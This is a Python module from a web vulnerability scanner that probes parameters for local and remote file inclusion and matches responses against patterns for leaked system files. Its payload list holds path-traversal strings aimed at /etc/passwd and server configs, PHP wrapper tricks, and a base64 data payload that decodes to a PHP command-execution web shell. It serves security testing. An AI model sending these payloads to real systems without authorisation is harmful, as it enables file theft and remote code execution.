"""
File Inclusion Scanner Module

Detects Local File Inclusion (LFI) and Remote File Inclusion (RFI)
vulnerabilities by attempting to include files through user input.

File inclusion allows attackers to:
- Read sensitive files (LFI)
- Execute remote malicious code (RFI)
- Achieve remote code execution
- Access configuration files and credentials
"""

import re
from typing import Dict, List, Any

from scanner.base import BaseScanner
from utils.http_helper import (
    inject_payload_in_url,
    inject_payload_in_form,
    extract_params
)


class FileInclusionScanner(BaseScanner):
    """
    Scanner for detecting Local/Remote File Inclusion vulnerabilities.
    
    This scanner tests for file inclusion by attempting to include
    known system files and checking for their content in responses.
    """
    
    @property
    def name(self) -> str:
        return "File Inclusion Scanner"
    
    @property
    def severity(self) -> str:
        return "Critical"
    
    def __init__(self, timeout: int = 10, delay: float = 0.5):
        super().__init__(timeout=timeout, delay=delay)
        
        # LFI payloads - attempting to read local system files
        self.lfi_payloads = [
            # Unix /etc/passwd
            "/etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "....\/....\/....\/etc/passwd",
            
            # Null byte injection (older PHP)
            "../../../etc/passwd%00",
            "../../../etc/passwd\x00",
            
            # Windows files
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../Windows/System32/drivers/etc/hosts",
            
            # Common web configs
            "../../../../../../../etc/apache2/apache2.conf",
            "../../../../../../../etc/nginx/nginx.conf",
            "../../../../../../../var/log/apache2/access.log",
            "../../../../../../../var/log/nginx/access.log",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "php://input",
            
            # Data wrapper
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ]
        
        # RFI payloads (testing with safe external URLs)
        self.rfi_payloads = [
            # These would normally point to attacker-controlled servers
            # Using non-malicious examples
            "http://example.com/test.txt",
            "https://example.com/test.txt",
            "//example.com/test.txt",
            "http://example.com/test.txt%00",
            "http://example.com/test.txt?",
        ]
        
        # Evidence patterns for successful file inclusion
        self.lfi_evidence = [
            # /etc/passwd patterns
            r"root:x?:\d+:\d+:.*:/root:",
            r"daemon:x?:\d+:\d+:",
            r"www-data:x?:\d+:\d+:",
            r"nobody:x?:\d+:\d+:",
            r"/bin/(?:ba)?sh",
            r"/sbin/nologin",
            r"/usr/sbin/nologin",
            
            # Windows hosts file
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            
            # Apache/Nginx configs
            r"<VirtualHost",
            r"DocumentRoot",
            r"ServerRoot",
            r"server\s*{",
            r"location\s+/",
            
            # Log file patterns
            r"\[\d{2}/\w{3}/\d{4}:",
            r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET\s+/",
            
            # Base64 encoded /etc/passwd
            r"cm9vdDp4OjA6",  # root:x:0:
        ]
        
        self.compiled_evidence = [
            re.compile(p, re.IGNORECASE | re.MULTILINE)
            for p in self.lfi_evidence
        ]
    
    def check_file_inclusion(self, response_text: str, baseline_text: str = "") -> tuple:
        """
        Check response for evidence of file inclusion.
        
        Args:
            response_text: HTTP response body
            baseline_text: Original response for comparison
            
        Returns:
            Tuple of (is_vulnerable, evidence)
        """
        for pattern in self.compiled_evidence:
            match = pattern.search(response_text)
            if match:
                # Verify this wasn't in the baseline
                if not pattern.search(baseline_text):
                    return True, match.group()[:100]
        return False, None
    
    def test_lfi(
        self,
        url: str,
        param: str,
        method: str = 'GET',
        form_data: Dict = None
    ) -> List[Dict]:
        """
        Test a parameter for Local File Inclusion.
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method
            form_data: Base form data for POST requests
            
        Returns:
            List of vulnerabilities found
        """
        vulns = []
        
        # Get baseline response
        if method == 'GET':
            baseline = self.make_request(url, method='GET')
        else:
            baseline = self.make_request(url, method='POST', data=form_data)
        
        baseline_text = baseline.text if baseline else ""
        
        for payload in self.lfi_payloads:
            try:
                if method == 'GET':
                    test_url = inject_payload_in_url(url, param, payload)
                    response = self.make_request(test_url, method='GET')
                else:
                    test_data = form_data.copy() if form_data else {}
                    test_data[param] = payload
                    response = self.make_request(url, method='POST', data=test_data)
                
                if response is None:
                    continue
                
                is_vulnerable, evidence = self.check_file_inclusion(
                    response.text,
                    baseline_text
                )
                
                if is_vulnerable:
                    self.add_vulnerability(
                        vuln_type="Local File Inclusion (LFI)",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        severity="Critical",
                        description=(
                            "The application is vulnerable to Local File Inclusion. "
                            "An attacker can read arbitrary files from the server, "
                            "potentially accessing sensitive configuration files, "
                            "source code, and credentials."
                        ),
                        recommendation=(
                            "Never use user input directly in file operations. "
                            "Use a whitelist of allowed files. Implement proper "
                            "input validation and sanitization. Disable dangerous "
                            "PHP wrappers if using PHP."
                        )
                    )
                    vulns.append(self.vulnerabilities[-1])
                    break
                
                self.throttle()
                
            except Exception as e:
                self.logger.debug(f"Error testing LFI on {url}: {e}")
        
        return vulns
    
    def test_rfi(
        self,
        url: str,
        param: str,
        method: str = 'GET',
        form_data: Dict = None
    ) -> List[Dict]:
        """
        Test a parameter for Remote File Inclusion.
        
        Note: This is a basic check. Full RFI testing requires
        a controlled external server to verify inclusion.
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method
            form_data: Base form data for POST requests
            
        Returns:
            List of vulnerabilities found
        """
        vulns = []
        
        # Get baseline
        if method == 'GET':
            baseline = self.make_request(url, method='GET')
        else:
            baseline = self.make_request(url, method='POST', data=form_data)
        
        baseline_text = baseline.text if baseline else ""
        baseline_len = len(baseline_text) if baseline_text else 0
        
        for payload in self.rfi_payloads:
            try:
                if method == 'GET':
                    test_url = inject_payload_in_url(url, param, payload)
                    response = self.make_request(test_url, method='GET')
                else:
                    test_data = form_data.copy() if form_data else {}
                    test_data[param] = payload
                    response = self.make_request(url, method='POST', data=test_data)
                
                if response is None:
                    continue
                
                # Check for RFI indicators
                # Look for external domain content being included
                if "example.com" in response.text and "example.com" not in baseline_text:
                    # This could indicate RFI
                    # In practice, you'd use a server you control
                    self.logger.info(
                        f"  Potential RFI indicator found for {param} "
                        f"(external content may have been included)"
                    )
                
                self.throttle()
                
            except Exception as e:
                self.logger.debug(f"Error testing RFI on {url}: {e}")
        
        return vulns
    
    def scan(self, urls: List[str], forms: List[Dict] = None) -> List[Dict]:
        """
        Scan for file inclusion vulnerabilities.
        
        Args:
            urls: List of URLs to scan
            forms: List of forms to test
            
        Returns:
            List of discovered vulnerabilities
        """
        self.vulnerabilities = []
        self.logger.info(f"  Testing {len(urls)} URLs for File Inclusion...")
        
        # Test URL parameters
        for url in urls:
            params = extract_params(url)
            
            for param in params:
                # Focus on parameters that might be file-related
                param_lower = param.lower()
                is_file_param = any(
                    keyword in param_lower
                    for keyword in ['file', 'page', 'path', 'include', 'doc', 
                                   'template', 'load', 'read', 'view', 'content']
                )
                
                self.logger.debug(f"  Testing parameter: {param}")
                
                # Test all params, but prioritize file-related ones
                self.test_lfi(url, param, method='GET')
                self.test_rfi(url, param, method='GET')
        
        # Test form parameters
        if forms:
            self.logger.info(f"  Testing {len(forms)} forms for File Inclusion...")
            
            for form in forms:
                url = form['action']
                method = form['method']
                
                base_data = {}
                for input_field in form['inputs']:
                    if input_field['name']:
                        base_data[input_field['name']] = input_field.get('value', 'test')
                
                for input_field in form['inputs']:
                    param = input_field['name']
                    if not param:
                        continue
                    
                    if input_field.get('type') in ['submit', 'button', 'image', 'reset']:
                        continue
                    
                    self.test_lfi(url, param, method=method, form_data=base_data)
        
        return self.vulnerabilities
